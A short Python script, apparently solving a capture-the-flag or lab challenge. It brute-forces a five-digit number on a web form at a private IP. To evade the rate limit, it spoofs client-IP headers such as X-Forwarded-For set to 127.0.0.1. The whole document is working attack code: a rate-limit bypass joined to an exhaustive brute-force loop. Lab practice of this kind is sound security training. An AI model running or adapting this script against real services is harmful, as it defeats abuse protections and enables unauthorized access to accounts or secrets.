import requests

headers = [
    "X-Originating-IP",
    "X-Forwarded-For",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Forwared-Host"
    ]

MACHINE_IP = "10.10.155.150"

url = f"http://{MACHINE_IP}:8085"

def brute(url:str):
    #session = requests.session()
    try:
        connection_checker=0
        for header in headers:
            connection_checker+=1
            if connection_checker >= 20:
                print(f"Succesfully connected.")
            print(f"[+] Header: {header}")
            notifier = 0
            for num in range(10000,99999):
                notifier += 1
                header_data = {
                    header: "127.0.0.1"
                }
                data = {
                    "number": num
                }
                req = requests.post(url,headers=header_data,data=data)
                if "rate limit execeeded" in req.text:
                    print(f"[-] Header {header} failed.")
                    break
                elif "Oh no! How unlucky. Spin the wheel and try again." in req.text:
                    pass
                else:
                    print(f"[+] Header {header} succeed.")
                    print(f"Magic number is: {num}")
                    break
                if notifier >= 50:
                    print(f"Last tried number: {num}")
                    print(f"Brute forcing by {header}...")
                    notifier = 0
    
    except KeyboardInterrupt:
        exit()
    except:
        connection_checker = 0
        print(f"[-]Connection error occured, trying to connect.")
        brute(url)

brute(url)
